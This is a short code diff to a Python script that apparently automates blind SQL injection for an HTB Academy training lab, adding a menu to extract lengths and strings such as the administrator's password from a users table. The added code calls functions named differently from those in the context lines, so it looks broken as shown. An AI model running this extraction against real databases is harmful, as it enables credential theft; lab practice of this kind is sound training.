@@ -48,3 +48,18 @@ def dump_string(q, length):
 #length=dump_length("password")
 #print(length)
 #print(dump_string("SELECT password FROM users WHERE username = 'administrator'", length))
+
+func = int(input("""HTB_ACADEMY_ORACLE
+(1) Get Length
+(2) Get Name
+Your Option : """))
+
+if func == 0:
+    test()
+elif func == 1:
+    payload = input("Payload : ")
+    print(dumpNumber(payload))
+elif func == 2:
+    payload = input("Payload : ")
+    string,length=payload.rsplit(maxsplit=1)
+    print(dumpString(string,int(length)))
